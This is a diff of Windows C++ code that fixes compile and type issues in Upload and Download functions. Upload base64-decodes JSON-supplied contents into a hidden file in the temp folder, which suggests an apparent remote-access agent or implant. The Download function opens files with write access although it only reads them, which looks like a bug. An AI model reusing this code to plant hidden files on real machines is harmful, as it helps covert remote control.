@@ -238,7 +238,7 @@ std::string Upload(rapidjson::Value* uploaded) {
     std::vector<BYTE> bytes = base64Decode(b64Contents);
     GetTempPathA(80, path);
     PathCombineA(fullPath, path, fileName.c_str());
-    HANDLE hFile = CreateFileA(fullPath, GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
+    HANDLE hFile = CreateFileA(fullPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
     if (hFile == INVALID_HANDLE_VALUE) {
         return "ERROR";
     }
@@ -260,17 +260,17 @@ std::string Download(std::string filepath) {
     if (file_attr & FILE_ATTRIBUTE_DIRECTORY) {
         return "DIR";
     }
-    HANDLE hFile = CreateFileA(filepath.c_str(), GENERIC_WRITE, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    HANDLE hFile = CreateFileA(filepath.c_str(), GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hFile == INVALID_HANDLE_VALUE) {
         return "ERROR";
     }
 
     LARGE_INTEGER size;
     DWORD lower = GetFileSizeEx(hFile, &size);
-    if (size.QuadPart >= 4 * 1024 * 1024 * 1024) {
+    if (size.QuadPart >= 1000000000) {
         return "TOO BIG";
     }
-    void* raw_buffer = malloc(size.QuadPart);
+    BYTE* raw_buffer = (BYTE*)malloc(size.QuadPart);
     if (raw_buffer == NULL) {
         return "ERROR";
     }
